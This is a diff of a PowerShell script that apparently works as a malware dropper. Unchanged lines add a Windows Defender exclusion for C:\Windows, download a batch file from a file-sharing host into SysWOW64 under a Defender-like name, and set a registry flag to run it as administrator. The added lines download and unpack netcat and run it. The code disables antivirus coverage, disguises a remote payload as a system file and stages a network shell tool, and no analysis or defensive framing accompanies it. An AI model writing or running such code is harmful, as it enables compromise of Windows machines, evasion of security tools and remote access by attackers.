@@ -4,3 +4,11 @@ Add-MpPreference -ExclusionPath "C:\Windows"
 Invoke-WebRequest -Uri 'https://www.upload.ee/download/16304248/6b5cbf563dfc1e5c7f97/setup.bat' -OutFile 'C:\Windows\SysWOW64\MpCmdStmp.bat'
 
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name C:\Windows\SysWOW64\MpCmdStmp.exe -Value RUNASADMIN -PropertyType string -Force | Out-Null
+
+Invoke-WebRequest -Uri 'https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip'
+
+Expand-Archive -Path netcat-win32-1.12.zip -DestinationPath netcat-win32-1.12
+
+cd netcat-win32-1.12
+
+.\nc.exe -h
